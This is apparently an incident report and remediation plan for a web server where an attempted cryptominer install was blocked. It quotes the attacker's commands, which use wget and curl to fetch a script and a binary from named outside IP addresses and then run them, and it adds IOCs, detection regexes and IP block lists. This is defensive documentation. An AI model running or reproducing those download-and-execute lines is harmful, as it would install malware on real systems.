# SECURITY INCIDENT REPORT
**Date:** December 9, 2025
**Severity:** CRITICAL
**Status:** MITIGATED

## Executive Summary
Active malware distribution attack detected and blocked. Attackers attempted to download and execute cryptocurrency mining malware on the server.

## Attack Timeline

### Attack Vectors Identified
1. **Primary Attack IP:** 176.117.107.158
2. **Secondary Attack IP:** 45.61.157.12

### Attack Methodology
The attacker attempted a sophisticated multi-stage attack:

```bash
# Stage 1: Create temp directory and cleanup
mkdir /tmp
cd /tmp
rm -rf *

# Stage 2: Download malicious script
wget http://176.117.107.158/r.sh
chmod 777 r.sh
sh r.sh

# Stage 3: Fallback download method
curl -O http://176.117.107.158/r.sh
chmod 777 r.sh
sh r.sh

# Stage 4: Download binary payload
wget http://45.61.157.12/x86
chmod +x x86
./x86

# Stage 5: Kill competing miners and establish persistence
pkill [various process names]
# Create persistence files in /dev/
```

### Attack Characteristics
- **Type:** Remote Code Execution (RCE) + Cryptocurrency Miner
- **Method:** Command injection attempt via URL parameters or form fields
- **Payload:** Shell script downloader + binary executable (likely cryptominer)
- **Persistence:** Attempted to create files in /dev/ directory
- **Process Termination:** Attempted to kill competing miners

## System Response

### Attack Failed Due To:
1. **Permission Restrictions:**
   - Cannot create /tmp (already exists)
   - Cannot write to /tmp (Operation not permitted)
   - Cannot write to /dev/ (Permission denied)
   - Cannot kill system processes (Operation not permitted)

2. **File System Protections:**
   - Read-only or protected directories
   - Insufficient privileges to modify system files

### Defense Mechanisms Implemented

#### 1. IP Blacklisting
Added to [middleware.ts:3-7](d:\09092025\17102025api\nextjs-frontend\middleware.ts#L3-L7):
```typescript
const BLACKLISTED_IPS = new Set([
  '176.117.107.158',  // Malware distribution server
  '45.61.157.12',     // Secondary attack server
]);
```

#### 2. Enhanced Pattern Detection
Updated malicious pattern detection to block:
- Shell commands: `wget`, `curl`, `chmod`, `mkdir`, `rm`, `kill`, `pkill`
- Shell scripts: `*.sh` files
- Suspicious directories: `/tmp`, `/var/tmp`, `/dev/`
- Direct IP URLs: `http://xxx.xxx.xxx.xxx`
- Command execution patterns: backticks, `$()`, pipe to shell

#### 3. URL Validation
Full URL inspection before processing any request.

#### 4. Security Headers
All responses include comprehensive security headers preventing XSS, clickjacking, MIME sniffing.

## Recommended Immediate Actions

### 1. Server-Level Firewall Rules

**For Linux (iptables):**
```bash
# Block attacking IPs
sudo iptables -A INPUT -s 176.117.107.158 -j DROP
sudo iptables -A INPUT -s 45.61.157.12 -j DROP
sudo iptables-save > /etc/iptables/rules.v4

# Block entire suspicious subnets (optional)
sudo iptables -A INPUT -s 176.117.0.0/16 -j DROP
sudo iptables -A INPUT -s 45.61.0.0/16 -j DROP
```

**For Windows Firewall:**
```powershell
# Block attacking IPs
New-NetFirewallRule -DisplayName "Block Malware IP 1" -Direction Inbound -RemoteAddress 176.117.107.158 -Action Block
New-NetFirewallRule -DisplayName "Block Malware IP 2" -Direction Inbound -RemoteAddress 45.61.157.12 -Action Block
```

### 2. Check for Compromised Files
```bash
# Search for recently modified files
find /tmp -mtime -1 -ls
find /var/tmp -mtime -1 -ls
find /dev -type f -mtime -1 -ls

# Look for suspicious processes
ps aux | grep -E 'wget|curl|r\.sh|x86'

# Check for unauthorized cron jobs
crontab -l
cat /etc/crontab
ls -la /etc/cron.*/*

# Check network connections
netstat -tulpn | grep ESTABLISHED
ss -tulpn
```

### 3. Laravel Backend Security Audit

**URGENT:** Check Laravel API for RCE vulnerabilities:

```bash
cd laravel-api

# Search for dangerous functions
grep -r "exec\|shell_exec\|system\|passthru\|proc_open" app/ routes/

# Check for eval usage
grep -r "eval(" app/ routes/

# Look for file_get_contents with user input
grep -r "file_get_contents" app/ routes/

# Check for unvalidated file uploads
grep -r "move_uploaded_file\|store(" app/
```

**Common Laravel Vulnerabilities to Check:**
1. **Unvalidated File Uploads** - Check all file upload endpoints
2. **SQL Injection** - Ensure using query builder/Eloquent (not raw queries)
3. **Deserialization** - Check for `unserialize()` with user input
4. **Command Injection** - Check any use of `exec()`, `shell_exec()`, etc.
5. **Path Traversal** - Validate all file path inputs

### 4. Update Environment Configuration

Add to `.env`:
```bash
# Security Settings
LOG_SECURITY_EVENTS=true
ENABLE_WAF=true
MAX_REQUEST_SIZE=10M

# Block dangerous IPs at application level
BLOCKED_IPS=176.117.107.158,45.61.157.12
```

## Long-Term Security Improvements

### 1. Install Web Application Firewall (WAF)
- **Cloudflare:** Free tier includes DDoS protection and WAF
- **ModSecurity:** Open-source WAF for Apache/Nginx
- **AWS WAF:** If hosting on AWS

### 2. Implement Intrusion Detection System (IDS)
```bash
# Install Fail2Ban (Linux)
sudo apt-get install fail2ban

# Configure custom jail for malicious patterns
sudo nano /etc/fail2ban/jail.local
```

### 3. Regular Security Audits
- Weekly: Review server logs for suspicious activity
- Monthly: Run vulnerability scanner (OWASP ZAP, Nikto)
- Quarterly: Professional penetration testing

### 4. Monitoring & Alerting
Set up alerts for:
- Failed authentication attempts (>5 in 1 minute)
- Unusual traffic patterns
- Known malicious IP addresses
- Command injection attempts
- File modifications in system directories

### 5. Server Hardening Checklist
- [ ] Disable unnecessary services
- [ ] Change default SSH port
- [ ] Implement SSH key authentication only
- [ ] Keep system packages updated
- [ ] Configure AppArmor or SELinux
- [ ] Enable automatic security updates
- [ ] Restrict file permissions (chmod 644 for files, 755 for dirs)
- [ ] Disable PHP dangerous functions in php.ini:
  ```ini
  disable_functions = exec,passthru,shell_exec,system,proc_open,popen,curl_exec,curl_multi_exec,parse_ini_file,show_source
  ```

## Indicators of Compromise (IOCs)

### Malicious IPs
```
176.117.107.158 - Primary malware distribution server
45.61.157.12 - Secondary attack server
```

### Malicious URLs
```
http://176.117.107.158/r.sh
http://45.61.157.12/x86
```

### File Hashes (if downloaded)
If you find these files, calculate SHA256 hash and report to:
- VirusTotal: https://www.virustotal.com/
- AbuseIPDB: https://www.abuseipdb.com/

### Attack Signatures
```regex
wget.*http://\d+\.\d+\.\d+\.\d+
curl.*http://\d+\.\d+\.\d+\.\d+
chmod\s+777.*\.sh
rm\s+-rf\s+\*
pkill.*miner
```

## Threat Intelligence

### Attack Attribution
- **Attack Type:** Automated botnet scanning for RCE vulnerabilities
- **Payload Type:** Cryptocurrency miner (likely XMRig or similar)
- **Target:** Web servers with unpatched vulnerabilities
- **Sophistication:** Medium (automated scanner, multi-stage payload)

### Similar Attacks
This matches known campaigns targeting:
- WordPress vulnerabilities
- Laravel CVEs
- Unpatched PHP applications
- Misconfigured servers

## Lessons Learned

1. **Defense in Depth Works:** Multiple layers prevented successful exploitation
2. **Input Validation Critical:** Always validate and sanitize all user inputs
3. **Monitoring Essential:** Early detection prevented damage
4. **Permissions Matter:** Restricted file system permissions blocked attack
5. **Regular Updates:** Keep all software components patched

## Files Modified (Defense)

### New Security Features
- [middleware.ts](d:\09092025\17102025api\nextjs-frontend\middleware.ts) - IP blacklist, enhanced pattern detection
- [SECURITY.md](d:\09092025\17102025api\nextjs-frontend\SECURITY.md) - Security documentation
- [INCIDENT_REPORT.md](d:\09092025\17102025api\nextjs-frontend\INCIDENT_REPORT.md) - This file

### Updated Configurations
- [next.config.ts](d:\09092025\17102025api\nextjs-frontend\next.config.ts) - Security headers
- [route.ts](d:\09092025\17102025api\nextjs-frontend\app\api\proxy\[...path]\route.ts) - CORS restrictions
- [server-https.js](d:\09092025\17102025api\nextjs-frontend\server-https.js) - TLS hardening

## Action Items

### Completed ✓
- [x] Block malicious IPs in application
- [x] Enhanced pattern detection
- [x] Security headers implemented
- [x] CORS restrictions enforced
- [x] Rate limiting active
- [x] TLS hardening
- [x] Build and deploy fixes

### Pending
- [ ] Implement server-level firewall rules
- [ ] Audit Laravel backend for vulnerabilities
- [ ] Install WAF (Cloudflare/ModSecurity)
- [ ] Set up monitoring and alerts
- [ ] Professional security audit
- [ ] Disable dangerous PHP functions
- [ ] Implement Fail2Ban
- [ ] Review server access logs
- [ ] Check for unauthorized files
- [ ] Rotate API keys/secrets (if compromised)

## Contact Information

**Report Security Issues:**
- Email: security@yourdomain.com (set up dedicated security email)
- Bug Bounty: Consider setting up responsible disclosure program

**Threat Intelligence Sharing:**
- Report IPs to AbuseIPDB: https://www.abuseipdb.com/report
- Submit malware to VirusTotal: https://www.virustotal.com/

## Appendix: Attack Logs

### Raw Error Output
```
mkdir: cannot create directory '/tmp': File exists
rm: cannot remove files: Operation not permitted
wget http://176.117.107.158/r.sh
HTTP request sent, awaiting response... 200 OK
r.sh: Operation not permitted
chmod: cannot access 'r.sh': No such file or directory
```

This indicates the attack was **BLOCKED** by system permissions.

---

**Document Status:** ACTIVE
**Last Updated:** 2025-12-09
**Next Review:** 2025-12-16
